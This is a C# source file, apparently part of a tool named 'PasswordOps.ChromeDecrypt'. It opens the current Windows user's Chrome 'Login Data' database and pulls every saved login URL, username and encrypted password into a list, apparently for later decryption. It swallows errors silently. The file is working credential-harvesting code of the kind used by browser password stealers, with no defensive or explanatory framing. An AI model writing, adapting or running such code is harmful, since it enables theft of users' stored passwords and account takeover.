using System;
using System.Collections.Generic;
using System.Data.SQLite;

namespace PS03.PasswordOps.ChromeDecrypt
{
    public class DBGrab
    {
        private readonly SQLiteConnection dbcon;

        public DBGrab()
        {
            var user = Environment.UserName;
            var path = "C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/Default";
            var constring = @"Data Source=" + path + "/Login Data;Version=3";
            dbcon = new SQLiteConnection(constring);

            try
            {
                dbcon.Open();
            }
            catch (Exception)
            {
                return;
            }
        }

        public List<CPProfile> GetCPP()
        {
            var CPPSList = new List<CPProfile>();

            var sql = "SELECT action_url, username_value, password_value FROM logins";
            var command = new SQLiteCommand(sql, dbcon);
            try
            {
                var reader = command.ExecuteReader();
                while (reader.Read())
                {
                    var CPPS = new CPProfile();
                    CPPS.ActionURL = reader["action_url"].ToString();
                    CPPS.Username = reader["username_value"].ToString();
                    CPPS.encPassword = (byte[]) (reader["password_value"]);
                    CPPSList.Add(CPPS);
                }
                return CPPSList;
            }
            catch (Exception)
            {
                return new List<CPProfile>();
            }
           
        }
    }
}